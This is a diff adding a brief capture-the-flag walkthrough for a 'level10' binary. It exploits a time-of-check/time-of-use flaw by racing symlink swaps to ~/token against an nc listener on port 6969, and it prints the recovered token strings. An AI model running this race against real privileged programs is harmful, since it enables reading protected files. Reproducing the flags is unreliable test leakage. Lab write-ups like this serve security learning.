@@ -1,0 +1,20 @@
+Inspect file level10
+- Send file to a server on port 6969
+- Check acces to files using acces so Symbolic link don't work
+
+Run a server
+- nc -lk 6969 &
+
+Exploit TTCTTU, 
+- make a race swap linked files
+- touch /tmp/nottk
+- while true; do
+    ln -sf /tmp/nottk /tmp/link
+    ln -sf ~/token /tmp/link
+done &
+- while true; do ./level10 /tmp/link 127.0.0.1; done
+-> woupa2yuojeeaaed06riuj63c
+-> feulo4b72j7edeahuete3no7c
+
+Kill background processes 
+- killall nc ln
